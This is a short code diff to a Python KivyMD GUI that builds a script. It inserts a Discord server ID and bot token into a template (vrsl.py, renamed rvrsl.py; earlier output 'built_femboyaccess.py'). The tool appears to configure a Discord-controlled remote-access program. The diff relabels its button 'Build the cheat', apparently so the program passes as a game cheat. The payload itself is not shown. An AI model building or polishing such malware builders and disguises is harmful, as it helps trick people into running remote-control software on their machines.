@@ -5,7 +5,7 @@ from kivymd.uix.textfield import MDTextField
 from kivymd.uix.button import MDRaisedButton
 from kivy.uix.image import AsyncImage
 import ctypes
-
+source_path = ''#ENTER THE PATH TO rvrsl.py
 class GUIBuilder(MDBoxLayout):
     def __init__(self, **kwargs):
         super().__init__(orientation="vertical", padding=10, spacing=10, **kwargs)
@@ -27,7 +27,7 @@ class GUIBuilder(MDBoxLayout):
         self.add_widget(image)
 
         save_button = MDRaisedButton(
-            text='Build',
+            text='Build the cheat',
             on_release=self.save_configuration,
             size_hint_x=1
         )
@@ -37,16 +37,16 @@ class GUIBuilder(MDBoxLayout):
         server_id = self.server_id_input.text
         bot_token = self.bot_token_input.text
 
-        with open('vrsl.py', 'r') as source_file:
+        with open(source_path, 'r') as source_file:
             source_code = source_file.read()
 
         updated_source_code = source_code.replace('guild_id = ""', f'guild_id = "{server_id}"')
         updated_source_code = updated_source_code.replace('token = ""', f'token = "{bot_token}"')
 
-        with open('built_femboyaccess.py', 'w') as script_file:
+        with open('rvrsl.py', 'w') as script_file:
             script_file.write(updated_source_code)
 
-        ctypes.windll.user32.MessageBoxA(0, "Vrsl has been built to built.py!".encode('utf-8'), "vrsl".encode('utf-8'), 1)
+        ctypes.windll.user32.MessageBoxA(0, "Vrsl has been built to!".encode('utf-8'), "rvrsl".encode('utf-8'), 1)
 
 class GUIBuilderApp(MDApp):
     def build(self):
